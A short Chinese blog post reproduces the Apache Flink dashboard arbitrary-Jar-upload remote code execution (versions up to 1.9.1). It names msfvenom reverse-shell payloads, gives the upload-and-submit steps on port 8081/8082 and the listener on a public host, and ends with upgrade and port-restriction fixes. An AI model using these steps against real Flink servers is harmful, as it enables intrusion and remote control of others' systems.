---
layout:     post
title:      Apache Flink任意Jar包上传导致远程代码执行
subtitle:   Apache Flink漏洞复现
date:       2020-08-21
author:     heria
header-img: img/post-bg-coffee.jpeg
catalog: true
tags:
---



### Apache Flink任意Jar包上传导致远程代码执行

![image-20210326151438763](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210326151438763.png)

### 阿里云主机异常告警特征

![image-20200821101149138](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20200821101149138.png)

### 复现

**步骤一**

msfvenom -p java/shell_reverse_tcp 生成反弹shell jar包  或者msfvenom -p java/meterpreter/reverse_tcp配合msf

![image-20200821095427504](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20200821095427504.png)



**步骤二**

flink 默认8081/8082端口  add new 上传文件 之后submit

![image-20200821095550530](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20200821095550530.png)

**步骤三**

公网机器开启监听 

![image-20210326151523401](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210326151523401.png)

成功复现





### 批量检测脚本

https://github.com/AleWong/Apache-Flink-Web-Dashboard-RCE





### 修复

#### 漏洞影响版本范围

<= 1.9.1

版本升级

https://flink.apache.org/downloads.html

#### 端口访问限制

8081端口访问限制（8082） 



### 参考链接：

https://blog.csdn.net/sun1318578251/article/details/103056168


